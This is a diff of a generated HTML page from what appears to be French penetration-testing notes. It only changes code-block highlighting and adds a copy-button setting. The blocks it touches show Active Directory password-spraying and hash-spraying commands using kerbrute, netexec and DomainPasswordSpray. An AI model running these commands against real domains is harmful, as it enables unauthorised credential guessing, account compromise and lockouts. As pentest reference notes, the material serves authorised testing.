@@ -7682,21 +7682,21 @@
 
 <h3 id="depuis-linux">Depuis Linux</h3>
 <p>Utilisation de kerbrute pour faire du password spraying sur une liste d'utilisateur et un password:</p>
-<pre><code class="language-bash">kerbrute passwordspray -d $domain --dc $ip users.txt  $password
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>kerbrute<span class="w"> </span>passwordspray<span class="w"> </span>-d<span class="w"> </span><span class="nv">$domain</span><span class="w"> </span>--dc<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>users.txt<span class="w">  </span><span class="nv">$password</span>
+</span></code></pre></div>
 <p>password spraying via netexec:</p>
-<pre><code class="language-bash">netexec smb $ip -u users.txt -p $password | grep +
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span><span class="nv">$password</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>+
+</span></code></pre></div>
 <p>Hash spraying avec netexec:</p>
-<pre><code class="language-bash">netexec smb $ip -u users.txt -H hash.txt | grep +
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-H<span class="w"> </span>hash.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>+
+</span></code></pre></div>
 <hr />
 <h3 id="depuis-windows">Depuis Windows</h3>
 <p><a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
-<pre><code class="language-powershell">Import-Module .\DomainPasswordSpray.ps1
-
-Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">DomainPasswordSpray</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="n">Welcome1</span> <span class="n">-OutFile</span> <span class="n">spray_success</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></code></pre></div>
 <hr />
 <table>
 <thead>
@@ -7790,7 +7790,7 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
